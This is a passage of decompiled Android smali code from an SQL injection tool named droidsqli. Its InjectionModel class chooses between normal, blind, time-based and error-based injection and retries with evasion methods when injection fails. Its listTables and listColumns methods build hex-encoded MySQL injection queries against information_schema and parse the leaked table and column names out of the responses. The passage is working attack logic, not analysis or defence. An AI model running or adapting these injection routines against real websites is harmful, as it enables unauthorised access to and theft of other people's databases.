    .restart local v0    # "con":Ljava/net/URLConnection;
    .restart local v2    # "reader":Ljava/io/BufferedReader;
    :cond_2
    :try_start_9
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v6, "remove-timebased"

    invoke-direct {v5, p0, v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_0

    .line 179
    :cond_3
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v6, "remove-blind"

    invoke-direct {v5, p0, v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_1

    .line 186
    :cond_4
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v6, "remove-errorbased"

    invoke-direct {v5, p0, v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_2

    :cond_5
    move v3, v4

    .line 190
    goto/16 :goto_3

    .line 198
    :cond_6
    iget-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isBlindInjectable:Z

    if-eqz v3, :cond_7

    .line 199
    const-string v3, "=> Using Blind Injection"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 200
    const/4 v3, 0x1

    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useBlindInjection:Z

    .line 201
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "binary-message"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Each request will ask \"Is the bit is true?\", and a true response must not contains the following false opcode: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->blindModel:Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    iget-object v6, v6, Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;->constantFalseMark:Ljava/util/List;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, p0, v4, v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_4

    .line 202
    :cond_7
    iget-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isTimeBasedInjectable:Z

    if-eqz v3, :cond_8

    .line 203
    const-string v3, "=> Using Time Based Injection"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 204
    const/4 v3, 0x1

    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useTimeBasedInjection:Z

    .line 205
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "binary-message"

    const-string v5, "Each request will ask \"Is the bit is true?\", and a true response must not exceed 5 seconds.\n"

    invoke-direct {v3, p0, v4, v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_4

    .line 208
    :cond_8
    iget v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    add-int/lit8 v3, v3, 0x1

    iput v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    .line 209
    iget v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    if-gt v3, v8, :cond_9

    .line 210
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "=> Injection not possible, testing evasion method "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v4, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 211
    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v4, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    .line 212
    invoke-virtual {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inputValidation()V
    :try_end_9
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_9 .. :try_end_9} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_9 .. :try_end_9} :catch_2
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    .line 256
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "end-preparation"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_6

    .line 215
    :cond_9
    :try_start_a
    new-instance v3, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v4, "=> Injection is not possible! Thread stopped."

    invoke-direct {v3, v4}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v3

    .line 219
    :cond_a
    const-string v3, "=> Using Normal Injection"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 220
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "add-normal"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V
    :try_end_a
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_a .. :try_end_a} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_a .. :try_end_a} :catch_2
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    .line 223
    :try_start_b
    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->firstSuccessPageSource:Ljava/lang/String;

    invoke-direct {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getVisibleIndex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->visibleIndex:Ljava/lang/String;
    :try_end_b
    .catch Ljava/lang/ArrayIndexOutOfBoundsException; {:try_start_b .. :try_end_b} :catch_4
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_b .. :try_end_b} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_b .. :try_end_b} :catch_2
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    goto/16 :goto_5

    .line 224
    :catch_4
    move-exception v1

    .line 226
    .local v1, "e":Ljava/lang/ArrayIndexOutOfBoundsException;
    :try_start_c
    iget v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    add-int/lit8 v3, v3, 0x1

    iput v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    .line 227
    iget v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    if-gt v3, v8, :cond_b

    .line 228
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "=> Injection is not possible. Testing evasion method "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v4, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 229
    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v4, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    .line 230
    invoke-virtual {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inputValidation()V
    :try_end_c
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_c .. :try_end_c} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_c .. :try_end_c} :catch_2
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    .line 256
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "end-preparation"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_6

    .line 233
    :cond_b
    :try_start_d
    new-instance v3, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v4, "=> Injection is not possible! Thread stopped."

    invoke-direct {v3, v4}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v3

    .line 245
    .end local v1    # "e":Ljava/lang/ArrayIndexOutOfBoundsException;
    :cond_c
    const-string v3, "=> Fetching Databases"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 247
    invoke-direct {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->listDatabases()V

    .line 248
    const-string v3, "=> Done!"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 250
    const/4 v3, 0x1

    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isInjectionBuilt:Z
    :try_end_d
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_d .. :try_end_d} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_d .. :try_end_d} :catch_2
    .catchall {:try_start_d .. :try_end_d} :catchall_0

    .line 256
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "end-preparation"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_6
.end method

.method public listColumns(Lnet/edgard/droidsqli/mvc/model/database/Table;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V
    .locals 13
    .param p1, "table"    # Lnet/edgard/droidsqli/mvc/model/database/Table;
    .param p2, "interruptable"    # Lnet/edgard/droidsqli/mvc/model/Interruptable;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    const/4 v12, 0x1

    const/4 v11, 0x0

    .line 879
    new-instance v6, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v7, "start-indeterminate-progress"

    invoke-direct {v6, p0, v7, p1}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 881
    new-array v4, v12, [Ljava/lang/String;

    const-string v6, ""

    aput-object v6, v4, v11

    .line 882
    .local v4, "pageSource":[Ljava/lang/String;
    new-instance v6, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v6, p0, p0, p2}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V

    const/4 v7, 0x5

    new-array v7, v7, [Ljava/lang/Object;

    .line 883
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "select+concat(group_concat(0x6868,hex(cast(n+as+char)),0x6a6a,0x3331,0x6868+order+by+n+separator+0x6767),0x69)from(select+COLUMN_NAME+n+from+information_schema.columns+where+TABLE_SCHEMA=0x"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 902
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v10, p1, Lnet/edgard/droidsqli/mvc/model/database/Table;->parentDatabase:Lnet/edgard/droidsqli/mvc/model/database/Database;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "+"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    .line 903
    const-string v9, "and+"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    .line 904
    const-string v9, "TABLE_NAME=0x"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "+"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    .line 905
    const-string v9, "order+by+n{limit}"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    .line 906
    const-string v9, ")x"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    .line 883
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v7, v11

    .line 907
    aput-object v4, v7, v12

    const/4 v8, 0x2

    .line 908
    invoke-static {v12}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    aput-object v9, v7, v8

    const/4 v8, 0x3

    .line 909
    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    aput-object v9, v7, v8

    const/4 v8, 0x4

    .line 910
    aput-object p1, v7, v8

    .line 882
    invoke-virtual {v6, v7}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 914
    .local v2, "hexResult":Ljava/lang/String;
    const-string v6, "hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh"

    const/16 v7, 0x22

    invoke-static {v6, v7}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v6

    invoke-virtual {v6, v2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v5

    .line 916
    .local v5, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v5}, Ljava/util/regex/Matcher;->find()Z

    move-result v6

    if-nez v6, :cond_0

    .line 917
    const-string v6, "Fetching columns fails"

    aget-object v7, v4, v11

    invoke-virtual {v7}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p0, v6, v7}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 935
    :goto_0
    new-instance v6, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v7, "end-indeterminate-progress"

    invoke-direct {v6, p0, v7, p1}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 936
    return-void

    .line 919
    :cond_0
    invoke-virtual {v5}, Ljava/util/regex/Matcher;->reset()Ljava/util/regex/Matcher;

    .line 922
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 923
    .local v1, "columns":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/database/Column;>;"
    :goto_1
    invoke-virtual {v5}, Ljava/util/regex/Matcher;->find()Z

    move-result v6

    if-nez v6, :cond_1

    .line 931
    new-instance v6, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v7, "add-columns"

    invoke-direct {v6, p0, v7, v1}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto :goto_0

    .line 924
    :cond_1
    invoke-virtual {v5, v12}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 926
    .local v0, "columnName":Ljava/lang/String;
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/database/Column;

    invoke-direct {v3, v0, p1}, Lnet/edgard/droidsqli/mvc/model/database/Column;-><init>(Ljava/lang/String;Lnet/edgard/droidsqli/mvc/model/database/Table;)V

    .line 927
    .local v3, "newColumn":Lnet/edgard/droidsqli/mvc/model/database/Column;
    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1
.end method

.method public listTables(Lnet/edgard/droidsqli/mvc/model/database/Database;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V
    .locals 13
    .param p1, "database"    # Lnet/edgard/droidsqli/mvc/model/database/Database;
    .param p2, "interruptable"    # Lnet/edgard/droidsqli/mvc/model/Interruptable;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/NumberFormatException;,
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    .line 806
    new-instance v8, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v9, "start-progress"

    invoke-direct {v8, p0, v9, p1}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v8}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 808
    iget-object v5, p1, Lnet/edgard/droidsqli/mvc/model/database/Database;->tableCount:Ljava/lang/String;

    .line 810
    .local v5, "tableCount":Ljava/lang/String;
    const/4 v8, 0x1

    new-array v2, v8, [Ljava/lang/String;

    const/4 v8, 0x0

    const-string v9, ""

    aput-object v9, v2, v8

    .line 811
    .local v2, "pageSource":[Ljava/lang/String;
    new-instance v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v8, p0, p0, p2}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V

    const/4 v9, 0x5

    new-array v9, v9, [Ljava/lang/Object;

    const/4 v10, 0x0

    .line 812
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "select+concat(group_concat(0x6868,hex(cast(r+as+char)),0x6a6a,hex(cast(ifnull(q,0x30)+as+char)),0x6868+order+by+r+separator+0x6767),0x69)from(select+TABLE_NAME+r,table_rows+q+from+information_schema.tables+where+TABLE_SCHEMA=0x"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 832
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "+"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    .line 833
    const-string v12, "order+by+r{limit}"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    .line 834
    const-string v12, ")x"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    .line 812
    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    aput-object v11, v9, v10

    const/4 v10, 0x1

    .line 836
    aput-object v2, v9, v10

    const/4 v10, 0x2

    .line 837
    const/4 v11, 0x1

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    aput-object v11, v9, v10

    const/4 v10, 0x3

    .line 838
    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v11

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    aput-object v11, v9, v10

    const/4 v10, 0x4

    .line 839
    aput-object p1, v9, v10

    .line 811
    invoke-virtual {v8, v9}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 844
    .local v0, "hexResult":Ljava/lang/String;
    const-string v8, "hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh"

    const/16 v9, 0x22

    invoke-static {v8, v9}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v8

    invoke-virtual {v8, v0}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v3

    .line 846
    .local v3, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v3}, Ljava/util/regex/Matcher;->find()Z

    move-result v8

    if-nez v8, :cond_0

    .line 847
    const-string v8, "Fetching tables fails"

    const/4 v9, 0x0

    aget-object v9, v2, v9

    invoke-virtual {v9}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {p0, v8, v9}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 866
    :goto_0
    new-instance v8, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v9, "end-progress"

    invoke-direct {v8, p0, v9, p1}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v8}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 867
    return-void

    .line 849
    :cond_0
    invoke-virtual {v3}, Ljava/util/regex/Matcher;->reset()Ljava/util/regex/Matcher;

    .line 852
    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    .line 853
    .local v7, "tables":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/database/Table;>;"
    :goto_1
    invoke-virtual {v3}, Ljava/util/regex/Matcher;->find()Z

    move-result v8

    if-nez v8, :cond_1

    .line 862
    new-instance v8, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v9, "add-tables"

    invoke-direct {v8, p0, v9, v7}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v8}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto :goto_0

    .line 854
    :cond_1
    const/4 v8, 0x1

    invoke-virtual {v3, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 855
    .local v6, "tableName":Ljava/lang/String;
    const/4 v8, 0x2

    invoke-virtual {v3, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 857
    .local v4, "rowCount":Ljava/lang/String;
